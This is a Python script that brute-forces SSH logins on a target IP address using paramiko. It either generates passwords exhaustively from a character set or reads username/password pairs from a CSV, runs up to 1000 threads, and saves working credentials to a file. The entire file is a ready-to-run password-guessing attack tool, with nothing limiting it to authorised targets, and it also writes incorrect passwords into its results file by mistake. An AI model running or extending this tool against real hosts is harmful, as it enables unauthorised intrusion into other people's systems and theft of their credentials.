import csv
import ipaddress
import threading
import time
import logging
from itertools import product
from queue import Queue, Empty
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

RESULT_FILE = "credentials_found.txt"
FAILED_ATTEMPTS = Queue(maxsize=5000)
MAX_QUEUE_SIZE = 2000
MAX_THREADS = 1000

# Lock for writing to the result file
file_lock = threading.Lock()

# Semaphore to control the number of concurrent threads
thread_semaphore = threading.Semaphore(MAX_THREADS)

def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=30)
        with file_lock:
            with open(RESULT_FILE, "a") as fh:
                print(f"[+] Username: {username} | Password: {password} | Host: {host} FOUND")
                fh.write(f"Host: {host}\nUsername: {username}\nPassword: {password}\n\n")
    except AuthenticationException:
         print(f"[-] Username: {username} | Password: {password} | Incorrect")
         with file_lock:
            with open(RESULT_FILE, "a") as fh:
                # print(f"[+] Username: {username} | Password: {password} | Host: {host} FOUND")
                fh.write(f"{password}\n")
    except ssh_exception.SSHException as e:
        # print(f"[!] Error: {e}. Adding {username}:{password} back to the retry queue.{FAILED_ATTEMPTS.qsize()}")
        FAILED_ATTEMPTS.put((username, password))  # Re-add failed attempt to the queue
    finally:
        ssh_client.close()
        thread_semaphore.release()  # Release the semaphore when the thread finishes

def process_queue_worker(host):
    while True:
        try:
            username, password = FAILED_ATTEMPTS.get(timeout=1)  # Wait for an item
            thread_semaphore.acquire()
            t = threading.Thread(target=ssh_connect, args=(host, username, password))
            t.start()
        except Empty:
            break  # Exit when the queue is empty
        except Exception as e:
            print(f"[!] Error: {e}.")

def brute_force(host, username):
    print("[!] Starting brute force...")
    # charset = "0123456789"
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#"
    min_length = int(input("Enter minimum password length: "))
    max_length = int(input("Enter maximum password length: "))

    for length in range(min_length, max_length + 1):
        for combo in product(charset, repeat=length):
            password = ''.join(combo)

            while FAILED_ATTEMPTS.qsize() >= MAX_QUEUE_SIZE:
                process_queue_worker(host)
                # time.sleep(0.1)  # Wait if queue is full

            thread_semaphore.acquire()
            t = threading.Thread(target=ssh_connect, args=(host, username, password))
            t.start()

    process_queue_worker(host)

def read_from_csv(host, csv_file):
    print("[!] Reading credentials from CSV...")
    try:
        with open(csv_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:  # Skip header row
                    continue
                username, password = row[0], row[1]

                while FAILED_ATTEMPTS.qsize() >= MAX_QUEUE_SIZE:
                    time.sleep(0.1)

                thread_semaphore.acquire()
                t = threading.Thread(target=ssh_connect, args=(host, username, password))
                t.start()
                time.sleep(0.0001)
        process_queue_worker(host)
    except FileNotFoundError:
        print("[!] CSV file not found. Please check the file path.")

def get_ip_address():
    while True:
        host = input("Please enter the host IP address: ")
        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Invalid IP address. Please try again.")

def main():
    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    print("Select an option:")
    print("1. Brute Force")
    print("2. Read from CSV")

    choice = input("Enter your choice (1/2): ")
    host = get_ip_address()

    if choice == "1":
        username = input("Enter the username to brute force: ")
        brute_force(host, username)
    elif choice == "2":
        csv_file = input("Enter the path to the CSV file: ")
        read_from_csv(host, csv_file)
    else:
        print("Invalid choice. Exiting.")
        return

    # Wait until the queue is empty and all threads finish
    while not FAILED_ATTEMPTS.empty():
        process_queue_worker(host)

    while thread_semaphore._value != MAX_THREADS:
        print("[!] Waiting for all threads to finish...")
        time.sleep(1)

    print("[!] All threads have finished. Exiting...")
    print(f"Final queue size: {FAILED_ATTEMPTS.qsize()}")

if __name__ == "__main__":
    main()
